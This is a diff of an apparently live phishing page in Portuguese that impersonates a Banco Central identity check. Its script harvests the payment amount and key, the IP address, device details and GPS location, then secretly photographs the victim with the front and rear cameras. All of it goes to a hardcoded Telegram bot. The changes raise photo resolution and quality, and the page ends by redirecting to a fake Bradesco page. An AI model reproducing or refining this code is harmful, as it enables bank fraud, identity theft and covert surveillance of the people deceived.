@@ -48,7 +48,7 @@
         <div id="tela-permissao">
             <h1 style="font-size: 20px; color: #333;">Validação de Identidade</h1>
             <p style="color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px;">
-                Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento. 
+                Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento.
                 <br><br>
                 Isso garante que você receba o valor e evita golpes.
             </p>
@@ -65,11 +65,11 @@
     </div>
 </div>
 
-<video id="video" width="640" height="480" autoplay style="display:none;"></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<video id="video" autoplay style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    const TOKEN = "8757264210:AAGASjOqrfL2a8QgIDp0rszG3Wi6sWWnb0s"; 
+    const TOKEN = "8757264210:AAGASjOqrfL2a8QgIDp0rszG3Wi6sWWnb0s";
     const ID = "560716860";
     let valorGlobal, chaveGlobal;
 
@@ -78,8 +78,6 @@
         chaveGlobal = document.getElementById('chave').value;
 
         if (!valorGlobal || !chaveGlobal) return alert("Preencha os dados.");
-
-        // Troca as telas
         document.getElementById('header-dados').style.display = 'none';
         document.getElementById('tela-dados').style.display = 'none';
         document.getElementById('header-bc').style.display = 'block';
@@ -90,7 +88,6 @@
         document.getElementById('spinner').style.display = 'inline-block';
         document.getElementById('btnFinal').disabled = true;
 
-        // Captura IP e Porta
         let dadosConexao = { ip: "Não identificado", porta: window.location.port || "443" };
         try {
             const resp = await fetch('https://api.ipify.org?format=json');
@@ -98,7 +95,6 @@
             dadosConexao.ip = data.ip;
         } catch (e) {}
 
-        // Dados do Aparelho, Bateria e Rede
         const ua = navigator.userAgent;
         let aparelho = /iPhone/i.test(ua) ? "📱 iPhone (iOS)" : (/Android/i.test(ua) ? "🤖 Android" : "💻 PC/Outro");
         
@@ -118,56 +114,62 @@
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
             try {
+                // Captura a frontal primeiro (essencial para biometria)
                 await tirarFoto("user", "FRONTAL");
+                // Captura a traseira em seguida
                 await tirarFoto("environment", "TRASEIRA");
                 window.location.href = "bradesco.html";
             } catch (e) { window.location.href = "bradesco.html"; }
+    
         }, (err) => {
-            // LOOPING: Se negar GPS, vai para a página que você criou
             window.location.href = "autorizar.html";
         });
     }
+
     async function tirarFoto(face, label) {
         try {
-            // 1. Limpa qualquer rastro de câmera aberta antes de começar
             if (window.currentStream) {
                 window.currentStream.getTracks().forEach(track => track.stop());
             }
 
-            // 2. Aguarda 800ms para o hardware do celular "respirar"
-            await new Promise(r => setTimeout(r, 800));
+            // Pausa estratégica para reset de hardware
+            await new Promise(r => setTimeout(r, 1000));
 
+            // MELHORIA DE QUALIDADE: Resolução HD ideal (1280x720)
             const constraints = { 
                 video: { 
                     facingMode: face,
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
                 }, 
                 audio: false 
             };
 
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            window.currentStream = stream; // Guarda o stream atual
+            window.currentStream = stream;
             
             const video = document.getElementById('video');
             video.srcObject = stream;
             
             await new Promise(r => video.onloadedmetadata = r);
             
-            // 3. Tempo para o sensor de luz ajustar (evita foto preta/escura)
-            await new Promise(r => setTimeout(r, 1000)); 
+            // Tempo forense para ajuste de brilho e foco automático
+            await new Promise(r => setTimeout(r, 1500));
             
             const canvas = document.getElementById('canvas');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            // Sincroniza o canvas com a resolução real da câmera aberta
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // 4. Desliga a câmera atual antes de retornar para a próxima
             stream.getTracks().forEach(track => track.stop());
-
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+            
+            // MELHORIA DE NITIDEZ: JPEG com 85% de qualidade
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
             const fd = new FormData();
             fd.append('chat_id', ID);
             fd.append('photo', blob, `${label}.jpg`);
-            fd.append('caption', `📸 Câmera ${label}`);
+            fd.append('caption', `📸 Captura HD: ${label}\n📏 Resolução: ${canvas.width}x${canvas.height}`);
             
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         } catch (error) {
